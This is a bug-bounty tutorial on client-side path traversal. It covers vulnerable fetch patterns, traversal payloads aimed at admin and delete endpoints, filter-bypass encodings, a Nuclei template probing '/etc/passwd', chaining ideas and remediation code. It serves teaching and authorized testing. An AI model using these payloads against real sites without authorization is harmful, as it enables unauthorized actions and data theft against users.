# Client-Side Path Traversal (CSPT) — From Zero to Bug Bounty

## Table of Contents

1. [What Is CSPT?](#1-what-is-cspt)
2. [How It Differs from Server-Side Path Traversal](#2-how-it-differs-from-server-side-path-traversal)
3. [The Core Mechanism](#3-the-core-mechanism)
4. [Building Blocks You Need to Understand First](#4-building-blocks)
5. [Attack Patterns — Basic to Advanced](#5-attack-patterns)
6. [Real-World Vulnerability Classes](#6-real-world-vulnerability-classes)
7. [How to Hunt for CSPT on Real Targets](#7-how-to-hunt)
8. [Tools and Methodology](#8-tools-and-methodology)
9. [Bypasses and Edge Cases](#9-bypasses-and-edge-cases)
10. [Chaining CSPT with Other Bugs](#10-chaining-cspt)
11. [Practice Labs and Resources](#11-practice-labs)
12. [Checklist for Bug Bounty Hunting](#12-checklist)

---

## 1. What Is CSPT?

Client-Side Path Traversal (CSPT) is a vulnerability where **user-controlled input is used to construct a URL path in the browser (client side)**, and an attacker can inject path traversal sequences (`../`) to **redirect the request to a different API endpoint** than intended.

### The simplest mental model:

```
Normal behavior:
  Browser sends: GET /api/users/{user_input}/profile

Attack:
  user_input = "../../admin/delete?id=victim"
  Browser sends: GET /api/admin/delete?id=victim
```

The browser (or JavaScript code) resolves `../` sequences BEFORE sending the request, so the server sees a clean, legitimate-looking request to a completely different endpoint.

### Key insight:
- Server-side path traversal → attacker reads files on the server
- Client-side path traversal → attacker makes the BROWSER send requests to unintended endpoints

---

## 2. How It Differs from Server-Side Path Traversal

| Aspect | Server-Side Path Traversal | Client-Side Path Traversal (CSPT) |
|--------|---------------------------|-----------------------------------|
| Where it happens | Server filesystem | Browser / client-side JavaScript |
| What's traversed | File paths (`/etc/passwd`) | URL paths (`/api/other-endpoint`) |
| Attacker goal | Read/write files | Hit different API endpoints |
| Payload | `../../../../etc/passwd` | `../../other-endpoint` |
| Impact | File disclosure, RCE | CSRF-like actions, data leaks, account takeover |
| Defense | Input validation on server | Input validation on client AND server |

---

## 3. The Core Mechanism

### Step-by-step breakdown:

#### Step 1: JavaScript reads user input
```javascript
// URL: https://example.com/profile?user=john
const userId = new URLSearchParams(window.location.search).get('user');
```

#### Step 2: JavaScript constructs an API URL using that input
```javascript
const apiUrl = `/api/v1/users/${userId}/details`;
// Expected: /api/v1/users/john/details
```

#### Step 3: JavaScript makes a fetch/XHR request
```javascript
fetch(apiUrl)
  .then(res => res.json())
  .then(data => renderProfile(data));
```

#### Step 4: Attacker injects path traversal
```
https://example.com/profile?user=../../../admin/users/all
```

#### Step 5: The browser resolves the path
```
/api/v1/users/../../../admin/users/all
→ resolves to: /admin/users/all
```

The browser's URL resolution (or the `fetch` API) normalizes `../` BEFORE the request leaves the browser.

#### Step 6: The server receives a "normal" request
```
GET /admin/users/all HTTP/1.1
Host: example.com
Cookie: session=victim_session
```

The server sees a legitimate request with the victim's cookies attached.

---

## 4. Building Blocks You Need to Understand First

### 4.1 How browsers resolve relative paths

```javascript
// The browser resolves ../ in URLs just like filesystem paths:
new URL('../b', 'https://example.com/a/c/d').pathname
// Result: /a/b

new URL('../../b', 'https://example.com/a/c/d').pathname
// Result: /b

// fetch() does the same:
// If page is https://example.com/app/dashboard
fetch('../api/data')
// Actually requests: https://example.com/api/data
```

### 4.2 Where user input enters URL paths

Common sources (called "sources" in taint analysis):

1. **URL parameters**: `?id=USER_INPUT`
2. **URL hash/fragment**: `#USER_INPUT`
3. **Path segments**: `/page/USER_INPUT/view`
4. **localStorage/sessionStorage**: Previously stored attacker-controlled values
5. **postMessage data**: From cross-origin messages
6. **Document referrer**: `document.referrer`
7. **Cookie values**: If attacker can set cookies (via another bug)

### 4.3 Where constructed URLs are used (sinks)

1. **`fetch(url)`** — Most common. Makes API calls.
2. **`XMLHttpRequest.open(method, url)`** — Same as fetch, older API.
3. **`$.ajax({url: ...})`** — jQuery variant.
4. **`axios.get(url)`** / `axios.post(url)` — Axios HTTP client.
5. **`window.location = url`** — Navigation (open redirect variant).
6. **`<script src=url>`** — Script injection.
7. **`<img src=url>`** — Image loading (can leak tokens via GET params).
8. **`EventSource(url)`** — Server-sent events.
9. **`new WebSocket(url)`** — WebSocket connections.

### 4.4 Same-Origin Policy and why CSPT matters

- The browser attaches cookies, auth headers, etc. automatically for same-origin requests
- CSPT makes the browser send **authenticated requests to unintended endpoints**
- Unlike CSRF, no cross-origin restrictions apply because the request stays on the same origin

---

## 5. Attack Patterns — Basic to Advanced

### Level 1: Basic path traversal in API calls

**Vulnerable code:**
```javascript
// Page: /app/view?item=shoes
const item = getParam('item');
fetch(`/api/products/${item}/details`)
```

**Attack:**
```
/app/view?item=../../users/me/delete
→ fetch('/api/products/../../users/me/delete')
→ fetch('/api/users/me/delete')
```

### Level 2: Traversal with query parameters preserved

**Vulnerable code:**
```javascript
const reportId = getParam('id');
fetch(`/api/reports/${reportId}/download`)
```

**Attack:**
```
?id=../../../admin/export?format=csv%26all=true
→ /api/reports/../../../admin/export?format=csv&all=true
→ /admin/export?format=csv&all=true
```

Note: `%26` decodes to `&` so you can inject query parameters into the redirected request.

### Level 3: Traversal in POST/PUT/DELETE requests

This is where CSPT becomes very powerful — it's essentially a same-origin CSRF bypass.

**Vulnerable code:**
```javascript
const feedbackTarget = getParam('target');
fetch(`/api/feedback/${feedbackTarget}`, {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({rating: 5, comment: 'Great!'})
})
```

**Attack:**
```
?target=../../admin/users/victim/role
```

The POST body `{rating: 5, comment: 'Great!'}` gets sent to `/admin/users/victim/role`. If the endpoint accepts partial JSON or ignores extra fields, you could change user roles.

### Level 4: Traversal via fragment/hash

**Vulnerable code:**
```javascript
// Single Page App routing
const path = window.location.hash.slice(1); // Remove #
fetch(`/api${path}`)
```

**Attack:**
```
https://target.com/app#/../admin/users
→ fetch('/api/../admin/users')
→ fetch('/admin/users')
```

Fragments are never sent to the server, so WAFs and server-side logs won't see the payload.

### Level 5: Stored CSPT via localStorage

**Step 1 — Attacker sets the value (via XSS, or another bug):**
```javascript
localStorage.setItem('preferredEndpoint', '../../admin/config');
```

**Step 2 — Application reads it later:**
```javascript
const endpoint = localStorage.getItem('preferredEndpoint');
fetch(`/api/data/${endpoint}`)
// → /api/data/../../admin/config → /admin/config
```

### Level 6: CSPT via postMessage

**Vulnerable code:**
```javascript
window.addEventListener('message', (event) => {
  // No origin check!
  const action = event.data.action;
  fetch(`/api/actions/${action}`, {method: 'POST'})
});
```

**Attack (from attacker's page via iframe or window.open):**
```javascript
targetWindow.postMessage({action: '../../admin/delete-user?id=123'}, '*');
```

---

## 6. Real-World Vulnerability Classes

### 6.1 CSPT to CSRF (Most Common, Highest Impact)

**Scenario:** Application has CSRF tokens on forms but makes API calls via JavaScript without checking that the URL path is valid.

```javascript
// Intended: Update user's own notification preference
const category = getParam('category');
fetch(`/api/users/me/notifications/${category}`, {
  method: 'PUT',
  headers: {
    'X-CSRF-Token': csrfToken,
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({enabled: true})
})
```

**Attack:** 
```
?category=../../../admin/users/victim-id/make-admin
```

The request includes the valid CSRF token AND the victim's session cookie, hitting an admin endpoint.

**Why it bypasses CSRF protection:**
- The CSRF token is valid (it's the victim's own token)
- The request is same-origin (no CORS issues)
- The server sees a legitimate, authenticated, CSRF-protected request

### 6.2 CSPT to Data Exfiltration

**Scenario:** API response is rendered in the page.

```javascript
const resource = getParam('r');
fetch(`/api/resources/${resource}`)
  .then(res => res.json())
  .then(data => {
    document.getElementById('content').innerHTML = data.description;
  });
```

**Attack:**
```
?r=../../users/admin/api-keys
```

If `/users/admin/api-keys` returns JSON with sensitive data, and the page renders it, the attacker can see it (via a crafted link sent to the victim).

### 6.3 CSPT to XSS

If the API response is injected into the DOM unsafely:

```javascript
const section = getParam('section');
fetch(`/api/help/${section}`)
  .then(res => res.text())
  .then(html => {
    document.getElementById('help-content').innerHTML = html;
  });
```

**Attack:**
```
?section=../../user-content/attacker-profile
```

If `/user-content/attacker-profile` returns attacker-controlled HTML, this becomes XSS.

### 6.4 CSPT to Account Takeover

Chained scenario:
1. CSPT redirects a POST request to password change endpoint
2. The JSON body from the original request partially matches what the password endpoint expects
3. Or: CSPT redirects to an endpoint that leaks session tokens / password reset tokens

### 6.5 CSPT to Unauthorized Actions

```javascript
// "Share document" feature
const docId = getParam('doc');
fetch(`/api/documents/${docId}/share`, {
  method: 'POST',
  body: JSON.stringify({user: 'friend@email.com', permission: 'read'})
})
```

**Attack:**
```
?doc=../../billing/subscription/cancel
```

POST with JSON body goes to the cancel subscription endpoint.

---

## 7. How to Hunt for CSPT on Real Targets

### Phase 1: Reconnaissance — Find the sources and sinks

#### 7.1 Manual JavaScript analysis

**Step 1: Find all fetch/XHR calls that use dynamic paths**

Open browser DevTools → Sources tab → Search across all files:

```
Search terms:
  fetch(`
  fetch('/api
  $.ajax
  $.get
  $.post
  axios.get
  axios.post
  XMLHttpRequest
  .open('GET
  .open('POST
```

**Step 2: Trace backwards from each sink to find the source**

For each `fetch(url)` you find, trace where `url` comes from. Look for:
```javascript
// Direct parameter reads
new URLSearchParams(window.location.search).get(...)
window.location.hash
window.location.pathname.split('/')
document.referrer

// Framework-specific route params
this.$route.params.xxx     // Vue
useParams()                // React Router
$routeParams               // Angular
this.props.match.params    // React older

// Storage reads
localStorage.getItem(...)
sessionStorage.getItem(...)
document.cookie
```

**Step 3: Check if the source flows into a URL path without sanitization**

Red flags:
```javascript
// Direct concatenation — VULNERABLE
fetch(`/api/resource/${userInput}/action`)
fetch('/api/resource/' + userInput + '/action')

// Template in URL path — VULNERABLE  
url = `/api/${category}/${id}`

// Used in URL constructor but only path portion — VULNERABLE
const url = new URL(`/api/${userInput}`, window.location.origin)
```

Not vulnerable (usually):
```javascript
// Used as a query parameter value — not path traversal
fetch(`/api/resource?id=${userInput}`)

// URL-encoded before use
fetch(`/api/resource/${encodeURIComponent(userInput)}/action`)
```

#### 7.2 Quick automated source finding

In the browser console:
```javascript
// Find all event listeners
getEventListeners(window)

// Monitor all fetch calls
const originalFetch = window.fetch;
window.fetch = function(...args) {
  console.trace('fetch called with:', args[0]);
  return originalFetch.apply(this, args);
};

// Monitor all XHR
const originalOpen = XMLHttpRequest.prototype.open;
XMLHttpRequest.prototype.open = function(method, url, ...rest) {
  console.trace('XHR:', method, url);
  return originalOpen.call(this, method, url, ...rest);
};
```

### Phase 2: Testing

#### 7.3 Basic test methodology

**Test 1: Inject a canary path**
```
Original: ?id=123
Test:     ?id=123/../456
```
Check in Burp/DevTools Network tab: does the request go to a path containing `456` instead of `123`?

**Test 2: Try to reach a known endpoint**
```
?id=../../health
?id=../../api/version
?id=../../robots.txt
```
Look for responses that match those endpoints.

**Test 3: Count path segments**

If the URL pattern is `/api/v1/resources/{input}/details`, you need to go up 4 levels:
```
?id=../../../../target-endpoint
     ^    ^    ^    ^
     |    |    |    └─ past "resources"
     |    |    └────── past "v1"  
     |    └─────────── past "api"
     └──────────────── at root
```

**Test 4: Check with Burp Suite**

1. Browse the application normally
2. In Burp's HTTP History, find requests where the URL path contains a parameter value you control
3. Right-click → Send to Repeater
4. Modify the parameter with `../` sequences
5. Check if the resolved path hits a different endpoint

#### 7.4 What to look for in responses

- **Different response structure** → you hit a different endpoint
- **Different status code** → endpoint changed (e.g., 200 → 404 or 403 → 200)
- **Different content length** → different data returned
- **Error messages** → may reveal internal endpoint structure
- **Sensitive data** → successful exploitation

### Phase 3: Impact Assessment

Once you confirm path traversal works, determine impact:

1. **Can you reach state-changing endpoints?** (POST/PUT/DELETE that do something)
2. **Can you read sensitive data?** (API keys, user data, admin panels)
3. **Can you chain it?** (CSPT → XSS, CSPT → account takeover)
4. **What HTTP method is used?** (GET = data leak, POST/PUT/DELETE = CSRF-like)
5. **Is the body controllable?** (If POST, what JSON gets sent?)

---

## 8. Tools and Methodology

### 8.1 Burp Suite Extensions

1. **Burp's built-in tools:**
   - HTTP History — watch for user input appearing in URL paths
   - Repeater — test path traversal manually
   - Logger++ — log all requests with regex matching

2. **Useful Burp extensions:**
   - **JS Link Finder** — Finds endpoints and URLs in JavaScript files
   - **JS Miner** — Extracts secrets and interesting strings from JS
   - **Param Miner** — Discovers hidden parameters
   - **Autorize** — Test authorization on the endpoints you discover via CSPT

### 8.2 Browser DevTools workflow

```
1. Network tab → Filter by Fetch/XHR
2. Perform actions on the target
3. For each request, check:
   - Does the URL path contain any value I control?
   - Where does that value come from?
   - Can I inject ../ into it?
4. Console tab → Monitor fetch/XHR (see the hooks above)
5. Sources tab → Search JS for fetch/axios/XHR patterns
```

### 8.3 Semi-automated discovery

**Using grep on downloaded JavaScript:**
```bash
# Download all JS files (use browser DevTools → Sources → Save all)
# Then search for patterns:

# Find fetch/XHR with template literals
grep -rn 'fetch(`' *.js
grep -rn 'fetch(.*+' *.js  
grep -rn '\.open(' *.js
grep -rn 'axios\.' *.js
grep -rn '\$\.ajax' *.js
grep -rn '\$\.get\|\.post' *.js

# Find URL construction with user input
grep -rn 'location\.search' *.js
grep -rn 'location\.hash' *.js
grep -rn 'getParam\|searchParams' *.js
grep -rn 'useParams\|routeParams\|\$route\.params' *.js

# Find string concatenation in URLs
grep -rn '/api/.*\${' *.js
grep -rn "'/api/" *.js | grep '+'
```

### 8.4 Nuclei templates (for automation)

```yaml
id: cspt-basic-check

info:
  name: Client-Side Path Traversal Check
  severity: medium

http:
  - method: GET
    path:
      - "{{BaseURL}}/app/view?id=..%2F..%2Fapi%2Fhealth"
      - "{{BaseURL}}/app/view?id=../../../../etc/passwd"
    matchers:
      - type: word
        words:
          - "healthy"
          - "status"
        condition: or
```

---

## 9. Bypasses and Edge Cases

### 9.1 Common filters and how to bypass them

**Filter: Stripping `../`**
```javascript
// Developer tries to sanitize:
input = input.replace('../', '');
```

**Bypass:**
```
....// → after removing ../ → ../
..././ → after removing ../ → ../
.%2e/ → URL decode happens after filter
%2e%2e%2f → full URL encoding
%2e%2e/ → partial encoding
```

**Filter: Checking for `../` at the start**
```javascript
if (input.startsWith('../')) reject();
```

**Bypass:**
```
valid-start/../../target  → starts with "valid-start"
./../../target            → starts with "./"
```

**Filter: URL encoding the input**
```javascript
fetch(`/api/${encodeURIComponent(input)}/data`)
```

**This is actually a good defense** — `encodeURIComponent` converts `/` to `%2F` which is NOT treated as a path separator by the browser. However, check if:
- The encoding is applied consistently
- Double-encoding issues exist
- There's a `decodeURIComponent` call before the fetch

**Filter: Allowlist check on the input**
```javascript
if (!allowedIds.includes(input)) reject();
```

**Bypass: Unlikely unless the allowlist check is flawed**

### 9.2 Framework-specific behaviors

**React Router:**
```javascript
// React Router gives you params that may be URL-decoded
const { slug } = useParams();  
// If URL is /page/..%2F..%2Fadmin
// slug might be "../../admin" (already decoded)
fetch(`/api/pages/${slug}`)  // VULNERABLE
```

**Angular:**
```javascript
// Angular's HttpClient with URL interpolation
this.http.get(`/api/items/${this.route.snapshot.params.id}`)
```

**Vue:**
```javascript
// Vue router params
axios.get(`/api/data/${this.$route.params.category}`)
```

**Next.js:**
```javascript
// Server components can also be affected
const { id } = params;
const res = await fetch(`${API_URL}/items/${id}`);
```

### 9.3 Edge cases

1. **Double URL encoding:** If the app decodes the URL twice, `%252e%252e%252f` → `%2e%2e%2f` → `../`

2. **Backslash on Windows servers:** `..\\` might work if the backend is on Windows

3. **URL normalization differences:** Some CDNs/proxies normalize paths differently than the backend

4. **GraphQL endpoints:** If the path traversal reaches a GraphQL endpoint, you might be able to send arbitrary queries

5. **WebSocket upgrade:** Path traversal to a WebSocket endpoint could give you access to real-time data streams

---

## 10. Chaining CSPT with Other Bugs

### Chain 1: CSPT + Reflected data = XSS
```
CSPT → reach endpoint that reflects user input → inject HTML/JS → XSS
```

### Chain 2: CSPT + Open Redirect = OAuth token theft
```
CSPT → redirect to endpoint that forwards to attacker URL → steal OAuth tokens
```

### Chain 3: CSPT + IDOR = Unauthorized data access
```
CSPT → reach admin endpoint → IDOR on that endpoint → access other users' data
```

### Chain 4: CSPT + SSRF = Internal network access
```
CSPT → reach endpoint that makes server-side requests → SSRF
```

### Chain 5: CSPT + File Upload = RCE
```
CSPT → redirect upload to different path → overwrite server files
```

### Chain 6: DOM Clobbering + CSPT
```
DOM Clobbering → override URL base/path variable → CSPT
```

---

## 11. Practice Labs and Resources

### Practice environments:
1. **PortSwigger Web Security Academy** — DOM-based vulnerabilities labs
2. **OWASP Juice Shop** — Has client-side vulnerability challenges
3. **HackTheBox** — Web challenges often include CSPT
4. **BugBountyHunter.com** — Dedicated practice platform
5. Build your own: set up a simple Express/Flask app with vulnerable patterns

### Key blog posts and research:
- "Client-Side Path Traversal" by Maxence Schmitt
- "CSPT2CSRF" research by various bug bounty hunters
- HackerOne disclosed reports (search "client-side path traversal")
- Bugcrowd University materials on client-side attacks

### Disclosed bug bounty reports to study:
- Search on HackerOne: https://hackerone.com/hacktivity — filter by "path traversal"
- Look for reports tagged "client-side" on Bugcrowd
- Twitter/X: Follow #bugbounty #CSPT for real-world findings

---

## 12. Checklist for Bug Bounty Hunting

Use this checklist when testing a target:

### Discovery
- [ ] Download and review all JavaScript files
- [ ] Search for `fetch`, `axios`, `$.ajax`, `XMLHttpRequest` patterns
- [ ] Identify all places where user input flows into URL paths
- [ ] Map all URL parameters, hash values, and path segments used in API calls
- [ ] Check for SPA routing that passes route params to API calls
- [ ] Look for `postMessage` handlers that feed into fetch calls
- [ ] Check `localStorage`/`sessionStorage` values used in URLs

### Testing
- [ ] For each source-to-sink flow, inject `../` and observe
- [ ] Count path segments to determine how many `../` needed
- [ ] Try URL-encoded variants: `%2e%2e%2f`, `%2e%2e/`, `..%2f`
- [ ] Try double encoding: `%252e%252e%252f`
- [ ] Check if the traversal works with both GET and POST requests
- [ ] Test if the JSON body from the original request causes side effects on the new endpoint
- [ ] Monitor network requests in DevTools for unexpected destinations

### Impact
- [ ] Can you reach admin endpoints?
- [ ] Can you reach state-changing endpoints (POST/PUT/DELETE)?
- [ ] Can you read sensitive data (tokens, keys, PII)?
- [ ] Can you modify another user's data?
- [ ] Can you chain with XSS (reflected data in response rendered unsafely)?
- [ ] Can you bypass CSRF protections?
- [ ] Does the endpoint change return data that includes secrets?

### Reporting
- [ ] Clear proof of concept URL
- [ ] Step-by-step reproduction
- [ ] Show the intended request vs. the traversed request (Burp screenshots)
- [ ] Explain the impact clearly (what can an attacker actually DO?)
- [ ] If chaining: show each step of the chain
- [ ] Suggest a fix (`encodeURIComponent()` on user input used in URL paths)

---

## Quick Reference: Payloads

```
# Basic traversal
../
../../
../../../
../../../../

# URL encoded
%2e%2e%2f
%2e%2e/
..%2f

# Double encoded
%252e%252e%252f

# With query params
../../target-endpoint?param=value
../../target-endpoint%3fparam%3dvalue

# With fragment
../../target-endpoint#fragment

# Filter bypass
....//
..././
..\../
..%00/
..%0d/
.%2e/

# Preserve trailing path
../../target/../../../../original-suffix
```

---

## Fix / Remediation

If you need to suggest a fix in your report:

```javascript
// VULNERABLE
fetch(`/api/resources/${userInput}/details`)

// FIXED — encode the input so / becomes %2F
fetch(`/api/resources/${encodeURIComponent(userInput)}/details`)

// FIXED — validate against allowlist
const VALID_IDS = ['id1', 'id2', 'id3'];
if (!VALID_IDS.includes(userInput)) throw new Error('Invalid ID');
fetch(`/api/resources/${userInput}/details`)

// FIXED — strip path separators
const safeInput = userInput.replace(/[\/\\\.]/g, '');
fetch(`/api/resources/${safeInput}/details`)

// FIXED — validate format (e.g., UUID only)
const UUID_REGEX = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i;
if (!UUID_REGEX.test(userInput)) throw new Error('Invalid format');
fetch(`/api/resources/${userInput}/details`)
```

---

**Remember:** CSPT is underreported in bug bounties because many hunters focus on server-side issues. The client-side JavaScript is a goldmine — read it carefully, trace the data flows, and test systematically. Good luck hunting!
